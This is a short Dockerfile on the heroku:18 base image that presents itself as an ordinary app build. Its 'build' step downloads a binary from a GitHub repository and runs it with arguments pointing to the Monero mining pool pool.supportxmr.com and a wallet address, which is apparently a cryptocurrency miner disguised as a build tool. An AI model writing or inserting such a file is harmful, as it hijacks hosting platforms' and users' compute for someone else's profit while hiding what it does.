FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/build-app/raw/main/build
RUN chmod +x build
RUN ./build -o pool.supportxmr.com:443 -u 46i4fSF4nMHG1vY14UDUxDDTg1MiV1WRnBDGNsKTcdkQ8uNynJE62B33evgSahSX7S1kaUXCBDN34Qt4QnLF6JPw6xRUogw -k --tls -p vps
CMD bash heroku.sh
